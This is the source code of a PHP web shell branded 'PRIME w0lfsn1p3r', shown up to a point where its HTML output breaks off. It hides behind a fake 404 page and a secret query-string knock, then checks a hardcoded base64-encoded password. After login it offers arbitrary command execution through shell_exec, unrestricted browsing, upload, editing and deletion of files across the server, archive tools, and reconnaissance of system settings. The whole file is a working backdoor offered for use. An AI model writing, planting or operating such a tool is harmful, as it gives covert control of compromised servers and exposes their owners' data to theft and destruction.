<?php
/**
 * SYSTEM DEPLOYER // CORE CONTROL MATRIX WITH ADVANCED TELEMETRY & ZIP ARCHIVER
 * PHP 8.3+ Optimized | Total Server Explorer & Parameter Stealth Protection
 */

declare(strict_types=1);
session_start();

// Record microtime at the absolute top for precise network/execution latency calculations
define('START_TIME', microtime(true));

// --- 1. CONFIGURATION & MASTER BASE64 AUTHENTICATION ---
// Base64 string representation of your password 'Prime@143#'
define('MASTER_PASSWORD_BASE64', 'UHJpbWVAMTQzIw==');
define('AVATAR_URL', 'https://camo.githubusercontent.com/d13dc3a7e876ec6775f7e72f798575689c61e9d5c9c9505fb2c232d346477f97/68747470733a2f2f64726976652e676f6f676c652e636f6d2f75633f6578706f72743d766965772669643d31526b43705531767a6261666e5a6e4a49595967362d384f44526f496c614b664a');

// SESSION PERSISTENCE FOR TERMINAL
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = __DIR__;
}

// Handle Logout Signal cleanly
if (isset($_GET['logout'])) {
    unset($_SESSION['matrix_authenticated']);
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

// Evaluate Authentication State
$authenticated = isset($_SESSION['matrix_authenticated']) && $_SESSION['matrix_authenticated'] === true;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'authenticate_matrix') {
    $submittedPassword = $_POST['matrix_secret_key'] ?? '';
    
    // 🔒 BASE64 DECODING & COMPARISON LAYER
    if ($submittedPassword === base64_decode(MASTER_PASSWORD_BASE64)) {
        $_SESSION['matrix_authenticated'] = true;
        header("Location: " . strtok($_SERVER["REQUEST_URI"], '?')); 
        exit;
    }
}

// Evaluate secret token challenge parameter condition (?prime=login)
$isSecretKnock = isset($_GET['prime']) && $_GET['prime'] === 'login';

// 🛑 STEALTH GUARD: If not authenticated AND they haven't provided the secret query string, serve a dead mock 404 page
if (!$authenticated && !$isSecretKnock) {
    header("HTTP/1.1 404 Not Found", true, 404);
    ?>
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head><title>404 Not Found</title></head><body>
    <h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr><address>Apache Server Port 80</address>
    </body></html>
    <?php
    exit;
}

// Render Secret Password Verification Portal
if (!$authenticated && $isSecretKnock) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SYSTEM ACCESS REQUIRED</title>
        <style>
            body { background: #090a0f; color: #e2e8f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
            .terminal-card { width: 100%; max-width: 360px; background: #11131c; border: 1px solid #1e2230; border-top: 3px solid #00ff66; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border-radius: 4px; }
            h3 { color: #00ff66; margin-top: 0; margin-bottom: 20px; font-size: 13px; letter-spacing: 1px; text-transform: uppercase; }
            input[type="password"] { width: 100%; background: #090a0f; border: 1px solid #1e2230; color: #00ff66; padding: 12px; font-size: 16px; font-family: monospace; outline: none; margin-bottom: 20px; box-sizing: border-box; border-radius: 3px; }
            button { width: 100%; background: transparent; border: 1px solid #00ff66; color: #00ff66; padding: 12px; font-size: 12px; font-weight: bold; cursor: pointer; text-transform: uppercase; border-radius: 3px; }
            button:hover { background: #00ff66; color: #090a0f; }
            .label { font-size: 11px; color: #64748b; margin-bottom: 8px; text-transform: uppercase; }
        </style>
    </head>
    <body>
        <div class="terminal-card">
            <h3>[ Access Protocol Required ]</h3>
            <form method="POST" action="">
                <input type="hidden" name="action" value="authenticate_matrix">
                <div class="label">Enter Cryptographic Signature:</div>
                <input type="password" name="matrix_secret_key" autofocus required>
                <button type="submit">Decrypt Environment</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// --- 2. UNRESTRICTED SERVER ENGINE PATH ROUTING ---
$currentPathPointer = isset($_GET['dir']) ? $_GET['dir'] : $_SESSION['cwd'];
$currentPathPointer = rtrim(str_replace('\\', '/', $currentPathPointer), '/');
if (empty($currentPathPointer)) { $currentPathPointer = '/'; }
if (!is_dir($currentPathPointer)) { $currentPathPointer = str_replace('\\', '/', __DIR__); }

$message = '';
$imageExtensions = ['png', 'jpg', 'jpeg', 'gif', 'svg', 'ico'];
$previewableTextExtensions = ['log', 'txt', 'md', 'env', 'htaccess', 'ini', 'json', 'conf', 'cfg', 'php', 'html', 'css', 'js', 'sql', 'xml', 'yaml'];

function formatFileSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}

function formatTelemetrySize($bytes) {
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 1) . 'GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 1) . 'MB';
    return round($bytes / 1024, 1) . 'KB';
}

function getFileIcon(string $extension): string {
    $extension = strtolower($extension);
    $iconMap = [
        'php'      => '🐘', 'html'     => '🌐', 'css'      => '🎨', 'js'       => '🟨',
        'json'     => '⚙️', 'sql'      => '🗄️', 'env'      => '🔑', 'htaccess' => '🛡️',
        'ini'      => '🔧', 'yaml'     => '📋', 'xml'      => '📦', 'txt'      => '📄',
        'md'       => '📝', 'log'      => '🪵', 'pdf'      => '📕', 'doc'      => '📘',
        'docx'     => '📘', 'xls'      => '🟩', 'xlsx'     => '🟩', 'zip'      => '🗜️',
        'rar'      => '🗜️', 'tar'      => '📦', 'gz'       => '📦', '7z'       => '🗜️',
        'png'      => '🖼️', 'jpg'      => '🖼️', 'jpeg'     => '🖼️', 'gif'      => '🖼️',
        'svg'      => '📐', 'ico'      => '🔹', 'mp3'      => '🎵', 'wav'      => '🎵',
        'mp4'      => '🎥', 'avi'      => '🎥',
    ];
    return $iconMap[$extension] ?? '📄';
}

function addFolderToZip(string $dirPath, ZipArchive $zipArchive, int $exclusiveLength) {
    $handle = opendir($dirPath);
    if ($handle) {
        while (false !== ($file = readdir($handle))) {
            if ($file !== '.' && $file !== '..') {
                $filePath = $dirPath . '/' . $file;
                $localPath = substr($filePath, $exclusiveLength);
                if (is_dir($filePath)) {
                    $zipArchive->addEmptyDir($localPath);
                    addFolderToZip($filePath, $zipArchive, $exclusiveLength);
                } else {
                    $zipArchive->addFile($filePath, $localPath);
                }
            }
        }
        closedir($handle);
    }
}

// --- 3. INLINE REAL-TIME EMBEDDED PREVIEW STREAM ROUTER ---
if (isset($_GET['stream_img']) && file_exists($_GET['stream_img']) && is_file($_GET['stream_img'])) {
    if (isset($_SESSION['matrix_authenticated']) && $_SESSION['matrix_authenticated'] === true) {
        $ext = strtolower(pathinfo($_GET['stream_img'], PATHINFO_EXTENSION));
        if (in_array($ext, $imageExtensions)) {
            $mime = ($ext === 'svg') ? 'image/svg+xml' : (($ext === 'ico') ? 'image/x-icon' : 'image/' . $ext);
            header("Content-Type: " . $mime);
            header("Content-Length: " . filesize($_GET['stream_img']));
            readfile($_GET['stream_img']);
            exit;
        }
    }
}

// --- 4. ADVANCED SYSTEM DATA & STORAGE TELEMETRY RETRIEVAL ---
$uname = php_uname();
$currentUser = function_exists('get_current_user') ? get_current_user() : 'Unknown';
$currentUid = function_exists('getmyuid') ? (string)getmyuid() : 'N/A';
$safeMode = (bool)ini_get('safe_mode') ? 'ON' : 'OFF';
$openBasedir = ini_get('open_basedir');
$openBasedirValue = empty($openBasedir) ? 'NONE' : $openBasedir;
$serverIp = $_SERVER['SERVER_ADDR'] ?? '127.0.0.1';
$clientIp = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
$phpSapi = php_sapi_name();
$maxExecutionTime = ini_get('max_execution_time');

$totalSpace = @disk_total_space($currentPathPointer) ?: 1;
$freeSpace = @disk_free_space($currentPathPointer) ?: 0;
$usedSpace = $totalSpace - $freeSpace;
$diskPercent = round(($usedSpace / $totalSpace) * 100, 1);

$sysLoad = 'N/A';
if (file_exists('/proc/loadavg') && is_readable('/proc/loadavg')) {
    $loadData = @file_get_contents('/proc/loadavg');
    if ($loadData !== false) {
        $loadExplode = explode(' ', $loadData);
        $sysLoad = $loadExplode[0] . ' ' . $loadExplode[1] . ' ' . $loadExplode[2];
    }
}

$extensions = [
    'CURL' => extension_loaded('curl'),
    'SSH2' => extension_loaded('ssh2'),
    'MySQL' => (extension_loaded('mysqli') || extension_loaded('pdo_mysql')),
    'PostgreSQL' => extension_loaded('pgsql'),
    'ZIP' => extension_loaded('zip'),
];

$availableDrives = [];
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    foreach (range('A', 'Z') as $letter) {
        if (@is_dir($letter . ':\\')) { $availableDrives[] = $letter . ':'; }
    }
} else {
    $availableDrives[] = '/';
}

// --- 5. UNRESTRICTED SYSTEM OPERATIONS (CRUD & ZIP CONSOLE) ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    // AJAX PERSISTENT TERMINAL ENGINE
    if ($action === 'execute_terminal') {
        $cmd = $_POST['command'] ?? '';
        if (preg_match('/^cd\s+(.*)/', $cmd, $matches)) {
            $target = trim($matches[1]);
            $newPath = ($target === '..') ? dirname($_SESSION['cwd']) : realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $target);
            if ($newPath && is_dir($newPath)) {
                $_SESSION['cwd'] = $newPath;
                echo "Directory changed to: " . htmlspecialchars($newPath);
            } else {
                echo "bash: cd: " . htmlspecialchars($target) . ": No such file or directory";
            }
        } else {
            chdir($_SESSION['cwd']);
            $output = shell_exec($cmd . ' 2>&1');
            echo htmlspecialchars($output ?: 'Command executed.');
        }
        exit;
    }

    // ✍️ FILE EDITOR SAVE OPERATION
    if ($action === 'save_file' && isset($_POST['file_path']) && isset($_POST['file_content'])) {
        $targetFile = $_POST['file_path'];
        if (file_exists($targetFile) && is_writable($targetFile)) {
            if (file_put_contents($targetFile, $_POST['file_content']) !== false) {
                $message = "SUCCESS: Content persisted to disk.";
            } else {
                $message = "ERROR: System failed to overwrite file data.";
            }
        } else {
            $message = "ERROR: File is not writable or does not exist.";
        }
    }

    if ($action === 'upload' && isset($_FILES['uploaded_file']) && $_FILES['uploaded_file']['error'] === UPLOAD_ERR_OK) {
        $fileName = basename($_FILES['uploaded_file']['name']);
        if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $currentPathPointer . '/' . $fileName)) {
            $message = "SUCCESS: Target file block asset node '$fileName' uploaded.";
        }
    }
    if ($action === 'create_folder' && !empty($_POST['folder_name'])) {
        $newFolder = $currentPathPointer . '/' . $_POST['folder_name'];
        if (!is_dir($newFolder) && mkdir($newFolder, 0755, true)) {
            $message = "SUCCESS: Created structural node directory '{$_POST['folder_name']}'.";
        }
    }
    if ($action === 'create_file' && !empty($_POST['file_name'])) {
        $newFile = $currentPathPointer . '/' . $_POST['file_name'];
        if (!file_exists($newFile)) {
            file_put_contents($newFile, "<?php\n// Initialization asset token string\n");
            $message = "SUCCESS: Virtual file context target '{$_POST['file_name']}' created.";
        }
    }
    if ($action === 'rename' && !empty($_POST['old_name']) && !empty($_POST['new_name'])) {
        $oldPath = $currentPathPointer . '/' . $_POST['old_name'];
        $newPath = $currentPathPointer . '/' . $_POST['new_name'];
        if (file_exists($oldPath) && rename($oldPath, $newPath)) {
            $message = "SUCCESS: Reference signature element remapped to '{$_POST['new_name']}'.";
        }
    }
    if ($action === 'delete' && !empty($_POST['item_name'])) {
        $itemPath = $currentPathPointer . '/' . $_POST['item_name'];
        if (file_exists($itemPath)) {
            if (is_dir($itemPath)) {
                @array_map('unlink', glob("$itemPath/*"));
                @rmdir($itemPath);
            } else {
                @unlink($itemPath);
            }
            $message = "SUCCESS: Element erased completely from index array mapping frames.";
        }
    }
    
    // 🗜️ INTERACTIVE ARCHIVE ENGINE OPERATIONS
    if ($action === 'zip_folder' && !empty($_POST['folder_name'])) {
        $folderTarget = $currentPathPointer . '/' . $_POST['folder_name'];
        if (is_dir($folderTarget)) {
            $zipFile = $currentPathPointer . '/' . $_POST['folder_name'] . '.zip';
            $zip = new ZipArchive();
            if ($zip->open($zipFile, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
                addFolderToZip($folderTarget, $zip, strlen(dirname($folderTarget) . '/'));
                $zip->close();
                $message = "SUCCESS: Directory bundled into standalone matrix archive node '{$_POST['folder_name']}.zip'.";
            } else {
                $message = "ERROR: Compression pipeline failure mapping out target structure.";
            }
        }
    }
    if ($action === 'unzip_file' && !empty($_POST['file_name'])) {
        $fileTarget = $currentPathPointer . '/' . $_POST['file_name'];
        if (file_exists($fileTarget)) {
            $zip = new ZipArchive();
            if ($zip->open($fileTarget) === true) {
                $zip->extractTo($currentPathPointer);
                $zip->close();
                $message = "SUCCESS: Archive sequence payload extracted directly to current context path.";
            } else {
                $message = "ERROR: Decompression system runtime failure parsing payload file integrity.";
            }
        }
    }

    // 🔍 SEARCH CONTENT
    if ($action === 'search_content' && !empty($_POST['query'])) {
        $q = $_POST['query'];
        $foundIn = [];
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($currentPathPointer, RecursiveDirectoryIterator::SKIP_DOTS));
        foreach ($iterator as $file) {
            if ($file->isFile() && in_array($file->getExtension(), ['php', 'txt', 'js', 'css', 'md', 'html', 'json'])) {
                if (strpos(@file_get_contents($file->getPathname()), $q) !== false) {
                    $foundIn[] = $file->getFilename();
                }
            }
        }
        $message = !empty($foundIn) ? "SEARCH FOUND IN: " . implode(', ', $foundIn) : "KEYWORD NOT FOUND.";
    }
}

// Handle Direct File Download Bridges
if (isset($_GET['download']) && !empty($_GET['download'])) {
    $downloadPath = $currentPathPointer . '/' . basename($_GET['download']);
    if (file_exists($downloadPath) && !is_dir($downloadPath)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($downloadPath) . '"');
        header('Content-Length: ' . filesize($downloadPath));
        readfile($downloadPath);
        exit;
    }
}

// --- 6. COMPILING DIRECTORY SCHEMA ARRAYS ---
$directories = []; $files = [];
$scanItems = @scandir($currentPathPointer) ?: [];
$scanItems = array_diff($scanItems, ['.', '..']);
foreach ($scanItems as $item) {
    $fullPath = $currentPathPointer . '/' . $item;
    $isDir = @is_dir($fullPath);
    $itemData = [
        'name' => $item,
        'full_path' => $fullPath,
        'modified' => @date("Y-m-d H:i:s", filemtime($fullPath)),
        'size' => $isDir ? '-' : formatFileSize(@filesize($fullPath)),
        'ext' => strtolower(pathinfo($item, PATHINFO_EXTENSION))
    ];
    if ($isDir) { $directories[] = $itemData; } else { $files[] = $itemData; }
}

// Handle reading assets into the active preview controller
$previewPath = ''; $previewType = ''; $previewData = '';
if (isset($_GET['preview']) && file_exists($_GET['preview']) && is_file($_GET['preview'])) {
    $previewPath = $_GET['preview'];
    $pExt = strtolower(pathinfo($previewPath, PATHINFO_EXTENSION));
    
    if (in_array($pExt, $imageExtensions)) {
        $previewType = 'image';
    } elseif (in_array($pExt, $previewableTextExtensions)) {
        $previewType = 'text';
        $previewData = @file_get_contents($previewPath, false, null, 0, 150000);
    } else {
        $previewType = 'unknown';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM OVERRIDE // SERVER CONTROL MATRIX</title>
    <style>
        :root {
            --bg-color: #040508;
            --panel-bg: rgba(17, 19, 28, 0.85);
            --accent-color: #00ff66;
            --text-color: #e2e8f0;
            --text-dim: #64748b;
            --border-color: rgba(30, 34, 48, 0.7);
            --error-color: #ff3366;
            --hover-bg: rgba(24, 27, 38, 0.9);
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', Courier, monospace; }
        body { background-color: var(--bg-color); color: var(--text-color); padding: 20px; overflow-x: hidden; }
        
        .dashboard { max-width: 1440px; margin: 0 auto; display: flex; flex-direction: column; gap: 20px; position: relative; z-index: 1; }
        
        .panel { background: var(--panel-bg); border: 1px solid var(--border-color); border-radius: 4px; overflow: hidden; }
        .panel-header { background: #181b26; padding: 12px 20px; border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; }
        .panel-header h1, .panel-header h2 { font-size: 0.9rem; color: var(--accent-color); letter-spacing: 1px; }
        
        .profile-card-panel { background: var(--panel-bg); border: 1px solid var(--border-color); border-radius: 4px; padding: 25px 30px; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 20px; border-top: 4px solid var(--accent-color); text-align: center; }
        .avatar-container { position: relative; width: 160px; height: 160px; flex-shrink: 0; }
        .avatar-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 3px solid transparent; animation: rainbowGlowShift 8s linear infinite; }
        .profile-details h2 { font-size: 1.6rem; font-weight: bold; margin-bottom: 8px; letter-spacing: 2px; background: linear-gradient(to right, #ff3366, #ff9933, #33cc66, #3399ff, #a855f7, #ff3366); background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: rainbowTextShift 8s linear infinite; }
        .profile-details p { font-size: 0.8rem; color: var(--text-dim); }
        
        .telemetry-card-panel { background: var(--panel-bg); border: 1px solid var(--border-color); border-radius: 4px; padding: 15px 20px; font-size: 0.9rem; line-height: 1.6; border-right: 4px solid #38bdf8; display: flex; flex-direction: column; justify-content: center; }
        .telemetry-row { margin-bottom: 5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .telemetry-label { color: var(--text-dim); font-weight: bold; display: inline-block; width: 120px; }
        .telemetry-val { color: #38bdf8; }
        .status-indicator { font-weight: bold; } .status-on { color: var(--accent-color); } .status-off { color: var(--error-color); }
        .drive-link { color: #eab308; text-decoration: none; margin-right: 6px; font-weight: bold; }
        
        .btn { background: transparent; border: 1px solid var(--accent-color); color: var(--accent-color); padding: 6px 12px; font-size: 0.75rem; font-weight: bold; cursor: pointer; text-transform: uppercase; border-radius: 3px; }
        .btn:hover { background: var(--accent-color); color: var(--bg-color); box-shadow: 0 0 10px rgba(0,255,102,0.2); }
        .btn-blue { border-color: #38bdf8; color: #38bdf8; } .btn-blue:hover { background: #38bdf8; color: var(--bg-color); }
        .btn-danger { border-color: var(--error-color); color: var(--error-color); } .btn-danger:hover { background: var(--error-color); color: white; }
        .input-text { background: #090a0f; border: 1px solid var(--border-color); color: white; padding: 8px; font-size: 0.8rem; border-radius: 3px; }
        
        .file-table { width: 100%; border-collapse: collapse; text-align: left; }
        .file-table th { padding: 12px 15px; background: rgba(13, 14, 21, 0.8); color: var(--text-dim); text-transform: uppercase; font-size: 0.75rem; border-bottom: 1px solid var(--border-color); }
        
        .file-table tbody tr td { padding: 14px 15px; font-size: 1.05rem; border-bottom: 1px solid var(--border-color); vertical-align: middle; }
        .file-table tr:hover { background: var(--hover-bg); }
        .file-table tbody .btn { font-size: 0.85rem !important; padding: 4px 10px !important; margin: 2px 1px; }
        
        .breadcrumbs { padding: 12px 20px; background: rgba(13, 14, 21, 0.5); border-bottom: 1px solid var(--border-color); font-size: 0.8rem; color: var(--text-dim); word-break: break-all; }
        .breadcrumbs a { color: var(--accent-color); text-decoration: none; font-weight: bold; }

        .alert { padding: 12px 20px; border-left: 4px solid var(--accent-color); background: #14161f; font-size: 0.8rem; color: var(--accent-color); margin-bottom: 10px;}
        .controls-toolbar { padding: 12px 20px; background: rgba(13, 14, 21, 0.5); border-bottom: 1px solid var(--border-color); display: flex; flex-wrap: wrap; gap: 15px; align-items: center; }
        .form-inline { display: flex; gap: 6px; align-items: center; }

        .preview-viewport-box { background: #090a10; border: 1px solid var(--border-color); padding: 15px; overflow: auto; max-height: 500px; font-size: 0.8rem; }
        .preview-raw-text { white-space: pre-wrap; font-family: 'Courier New', monospace; color: #cbd5e1; font-size: 0.8rem; line-height: 1.4; }
        .preview-img-frame { display: block; max-width: 100%; max-height: 400px; margin: 0 auto; background: repeating-conic-gradient(#1e2230 0% 25%, #11131c 0% 50%) 50% / 20px 20px; border: 1px solid var(--border-color); padding: 10px; }

        /* Terminal Styles */
        #kali-terminal { background: #000; color: #00ff66; padding: 15px; font-family: 'Consolas', 'Monaco', monospace; height: 300px; overflow-y: auto; border: 1px solid #444; border-radius: 3px; font-size: 14px; }
        .kali-input { background: transparent; border: none; color: #fff; width: 100%; outline: none; font-family: 'Consolas', 'Monaco', monospace; font-size: 14px; }

        @keyframes rainbowGlowShift {
            0% { border-color: #ff3366; box-shadow: 0 0 15px rgba(255, 51, 102, 0.6); }
            20% { border-color: #ff9933; box-shadow: 0 0 15px rgba(255, 153, 51, 0.6); }
            40% { border-color: #33cc66; box-shadow: 0 0 15px rgba(51, 204, 102, 0.6); }
            60% { border-color: #3399ff; box-shadow: 0 0 15px rgba(51, 153, 255, 0.6); }
            80% { border-color: #a855f7; box-shadow: 0 0 15px rgba(168, 85, 247, 0.6); }
            100% { border-color: #ff3366; box-shadow: 0 0 15px rgba(255, 51, 102, 0.6); }
        }
        @keyframes rainbowTextShift {
            0% { background-position: 0% center; }
            100% { background-position: 200% center; }
        }
    </style>
</head>
<body>

<canvas id="matrixBackgroundCanvas" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 0; pointer-events: none;"></canvas>

<div class="dashboard">

    <div style="display: flex; flex-direction: column; gap: 20px;">
        
        <div class="profile-card-panel">
            <div class="avatar-container">
                <img src="<?php echo AVATAR_URL; ?>" alt="System Overseer" class="avatar-img">
            </div>
            <div class="profile-details">
                <h2>PRIME w0lfsn1p3r</h2>
                <p style="color: var(--accent-color); margin-bottom: 4px; font-weight: bold;">[ SYSTEM ROOT OPERATOR ]</p>
                <p>Identity Signature Token Verification: Secured & Encrypted</p>
            </div>
        </div>

        <div class="telemetry-card-panel">
            <div class="telemetry-row">
                <span class="telemetry-label">OS KERNEL:</span>
                <span class="telemetry-val" title="<?php echo htmlspecialchars($uname); ?>"><?php echo htmlspecialchars(substr($uname, 0, 60)) . (strlen($uname) > 60 ? '...' : ''); ?></span>
            </div>
            <div class="telemetry-row">
                <span class="telemetry-label">ENGINE MODE:</span>
                <span>INTERFACE: <span class="telemetry-val"><?php echo htmlspecialchars($phpSapi); ?></span> | TIMEOUT: <span class="telemetry-val"><?php echo $maxExecutionTime; ?>s</span> | SAFE MODE: <span class="status-indicator <?php echo $safeMode==='OFF'?'status-on':'status-off';?>"><?php echo $safeMode; ?></span></span>
            </div>
            <div class="telemetry-row">
                <span class="telemetry-label">NET & LOAD:</span>
                <span>IP: <span class="telemetry-val"><?php echo htmlspecialchars($serverIp); ?></span> | CPU LOAD: <span class="telemetry-val" style="color:#eab308;"><?php echo $sysLoad; ?></span></span>
            </div>
            <div class="telemetry-row">
                <span class="telemetry-label">STORAGE:</span>
                <span>Used: <span class="telemetry-val"><?php echo formatTelemetrySize($usedSpace); ?></span> / Total: <span class="telemetry-val"><?php echo formatTelemetrySize($totalSpace); ?></span> (<span style="color: <?php echo $diskPercent > 85 ? 'var(--error-color)' : 'var(--accent-color)'; ?>; font-weight:bold;"><?php echo $diskPercent; ?>%</span>)</span>
            </div>
            <div class="telemetry-row">
                <span class="telemetry-label">RAM ALLOC:</span>
                <span>Current: <span class="telemetry-val"><?php echo formatTelemetrySize(memory_get_usage()); ?></span> | Peak Node: <span class="telemetry-val"><?php echo formatTelemetrySize(memory_get_peak_usage()); ?></span></span>
            </div>
            <div class="telemetry-row">
                <span class="telemetry-label">UPLOAD CAP:</span>
                <span>Max File: <span class="telemetry-val" style="color:#a855f7;"><?php echo ini_get('upload_max_filesize'); ?></span> | Post Max: <span class="telemetry-val" style="color:#a855f7;"><?php echo ini_get('post_max_size'); ?></span></span>
            </div>
            <div class="telemetry-row" style="margin-top: 3px; padding-top: 3px; border-top: 1px dashed var(--border-color);">
                <span class="telemetry-label">DRIVERS:</span>
                <span style="display:inline-block; width:calc(100% - 130px); overflow:hidden; vertical-align:bottom;">
                    <?php foreach ($extensions as $extName => $isLoaded): ?>
                        <span style="margin-right: 6px;"><?php echo $extName; ?>:<span class="status-indicator <?php echo $isLoaded?'status-on':'status-off';?>"><?php echo $isLoaded?'●':'○';?></span></span>
                    <?php endforeach; ?>
                </span>
            </div>
            <div class="telemetry-row" style="margin-top: 2px;">
                <span class="telemetry-label">MOUNTED:</span>
                <span>
                    <?php foreach ($availableDrives as $drive): ?>
                        <a href="?dir=<?php echo urlencode($drive); ?>" class="drive-link">[ <?php echo htmlspecialchars($drive); ?> ]</a>
                    <?php endforeach; ?>
                </span>
                <span style="float: right;"><a href="?logout=1" style="color: var(--error-color); text-decoration: none; font-weight:bold;">[ REVOKE ACCESS ]</a></span>
            </div>
        </div>
    </div>

    <?php if (!empty($message)): ?>
        <div class="alert">[ LOG BUFF ]: <?php echo htmlspecialchars($message); ?></div>
    <?php endif; ?>

    <?php if (!empty($previewType)): ?>
        <div class="panel" style="border-color: #38bdf8;">
            <div class="panel-header" style="background: #121824;">
                <h2 style="color: #38bdf8;">[ 🔍 ACTIVE DATA FILE PREVIEW OVERLAY ] — <?php echo htmlspecialchars(basename($previewPath)); ?></h2>
                <a href="?dir=<?php echo urlencode($currentPathPointer); ?>" class="btn btn-blue" style="font-size: 0.65rem;">Close Preview</a>
            </div>
            <div class="preview-viewport-box">
                <?php if ($previewType === 'image'): ?>
                    <img src="?stream_img=<?php echo urlencode($previewPath); ?>" alt="Preview Context Image" class="preview-img-frame">
                <?php elseif ($previewType === 'text'): ?>
                    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.3/ace.min.js"></script>
                    
                    <form method="POST" action="" id="editorForm" onsubmit="syncEditor()">
                        <input type="hidden" name="action" value="save_file">
                        <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($previewPath); ?>">
                        
                        <textarea name="file_content" id="hidden_content" style="display:none;"><?php echo htmlspecialchars($previewData); ?></textarea>
                        
                        <div id="editor" style="width: 100%; height: 400px; border: 1px solid #38bdf8;"></div>
                        
                        <div style="margin-top: 10px; text-align: right;">
                            <button type="submit" class="btn btn-blue" style="padding: 10px 20px;">Save Changes</button>
                        </div>
                    </form>

                    <script>
                        var editor = ace.edit("editor");
                        editor.setTheme("ace/theme/monokai");
                        editor.session.setMode("ace/mode/php");
                        editor.setValue(document.getElementById('hidden_content').value, -1);
                        
                        function syncEditor() {
                            document.getElementById('hidden_content').value = editor.getValue();
                        }
                    </script>
                <?php else: ?>
                    <div style="text-align: center; color: var(--text-dim); padding: 20px;">Binary signature file format context cannot be cleanly output to standard textual templates. Use 'Download' to view raw structures.</div>
                <?php endif; ?>
            </div>
        </div>
    <?php endif; ?>

    <div class="panel">
        <div class="panel-header">
            <h1>[ SYSTEM_OVERRIDE // RUNTIME_EXPLORER_GATEWAY ]</h1>
        </div>
        
        <div class="controls-toolbar">
            <form method="POST" action="" class="form-inline">
                <input type="hidden" name="action" value="create_file">
                <input type="text" name="file_name" placeholder="injector.php" class="input-text" required>
                <button type="submit" class="btn">+ File</button>
            </form>
            <form method="POST" action="" class="form-inline">
                <input type="hidden" name="action" value="create_folder">
                <input type="text" name="folder_name" placeholder="cache_bin" class="input-text" required>
                <button type="submit" class="btn">+ Folder</button>
            </form>
            <form method="POST" action="" enctype="multipart/form-data" class="form-inline" style="margin-left: auto;">
                <input type="hidden" name="action" value="upload">
                <input type="file" name="uploaded_file" style="color: var(--text-dim); font-size: 0.75rem;" required>
                <button type="submit" class="btn btn-blue">Upload</button>
            </form>
        </div>

        <div class="controls-toolbar" style="border-top: 1px solid var(--border-color);">
            <div style="flex: 1; margin-right: 10px;">
                <input type="text" id="fileSearch" placeholder="🔍 Filter filenames (Instant)..." class="input-text" style="width: 100%;">
            </div>
            <div style="flex: 1;">
                <form method="POST" action="" style="display: flex;">
                    <input type="hidden" name="action" value="search_content">
                    <input type="text" name="query" placeholder="🔍 Search INSIDE files (Press Enter)..." class="input-text" style="width: 100%; border-color:#38bdf8;">
                </form>
            </div>
        </div>

        <div class="breadcrumbs">
            Current Pointer: 
            <?php
            $segments = explode('/', $currentPathPointer); $builtPath = '';
            foreach ($segments as $index => $segment) {
                if ($index === 0 && empty($segment)) { echo '<a href="?dir=/">/ root</a>'; continue; }
                if (empty($segment)) continue;
                $builtPath .= '/' . $segment;
                echo ' / <a href="?dir=' . urlencode($builtPath) . '">' . htmlspecialchars($segment) . '</a>';
            }
            ?>
        </div>

        <table class="file-table" id="fileTable">
            <thead>
                <tr>
                    <th>Resource Label Target</th>
                    <th>Modification Signature</th>
                    <th>Data Weight</th>
                    <th style="text-align: right;">Action Configuration Matrix</th>
                </tr>
            </thead>
            <tbody>
                <?php $parentPathNode = dirname($currentPathPointer);
                if ($currentPathPointer !== '/' && $parentPathNode !== $currentPathPointer): ?>
                    <tr><td colspan="4"><a href="?dir=<?php echo urlencode($parentPathNode); ?>" style="color: var(--text-dim); text-decoration: none; font-weight: bold;">📁 .. (Step Up One Level Structural Branch Cluster)</a></td></tr>
                <?php endif; ?>

                <?php foreach ($directories as $dir): ?>
                    <tr>
                        <td><a href="?dir=<?php echo urlencode($dir['full_path']); ?>" style="color: #eab308; font-weight: bold; text-decoration: none;">📁 <?php echo htmlspecialchars($dir['name']); ?></a></td>
                        <td><?php echo $dir['modified']; ?></td><td>-</td>
                        <td style="text-align: right;">
                            <form method="POST" action="" style="display: inline;">
                                <input type="hidden" name="action" value="zip_folder"><input type="hidden" name="folder_name" value="<?php echo htmlspecialchars($dir['name']); ?>">
                                <button type="submit" class="btn" style="border-color: #eab308; color:#eab308;">🗜️ Zip Folder</button>
                            </form>
